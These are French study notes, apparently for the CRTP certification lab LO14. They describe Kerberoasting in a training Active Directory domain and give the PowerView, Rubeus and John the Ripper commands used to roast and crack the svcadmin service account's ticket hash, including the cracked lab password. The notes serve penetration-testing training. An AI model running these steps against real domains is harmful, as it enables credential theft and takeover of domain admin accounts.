# Kerberoasting — LO14

> [!summary] Demander le TGS d'un compte **user** portant un SPN, puis cracker offline son hash (le TGS est chiffré avec le hash du compte de service). Cible type CRTP : `svcadmin` (DA avec SPN). Cadre lab/cert : voir [[CRTP - Index]].

**But :** password d'un compte de service → souvent chemin direct vers DA. · **Pré :** n'importe quel user du domaine (aucun privilège).

```powershell
Get-DomainUser -SPN                                  # 1. comptes user à SPN (PowerView)
Rubeus.exe kerberoast /stats                         # 2. surface kerberoastable
Rubeus.exe kerberoast /user:<USER> /simple /rc4opsec /outfile:hashes.txt   # 3. roast
john.exe --wordlist=<wordlist> hashes.txt            # 4. crack
```

⚠️ **Avant John : retirer le `:1433` (port) du SPN dans `hashes.txt`** sinon le hash ne charge pas. `/rc4opsec` ignore les comptes AES-only (furtif mais peut rater des cibles → sinon `/rc4`). Un compte **machine** n'est jamais crackable → viser les comptes **user**.

> [!tip]- Dans quel cas l'utiliser
> Dès qu'un user du domaine est compromis : c'est la 1re passe « gratuite » (aucun privilège requis). Prioritaire si l'énumération montre un SPN sur un compte à `admincount=1` ou membre de Domain Admins.

> [!example]- Commandes exactes du lab — LO14
> ```text
> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
> . C:\AD\Tools\PowerView.ps1
> Get-DomainUser -SPN          # -> svcadmin : MSSQLSvc/dcorp-mgmt...:1433, memberof Domain Admins
>
> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ^
>   kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
>
> # Éditer hashes.txt : supprimer ":1433" du SPN
> #   ...MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*  ->  ...local*
>
> C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe ^
>   --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
> #  -> svcadmin : ThisisBlasphemyThisisMadness!!
> ```

**Voir aussi :** [[Cheatsheet - AS-REP Roasting]] · [[Cheatsheet - Tickets Kerberos]] · [[Cheatsheet - MSSQL et PowerUpSQL]] · [[Synthèse - Kerberos]] · [[Cheatsheet - Toutes les commandes]]
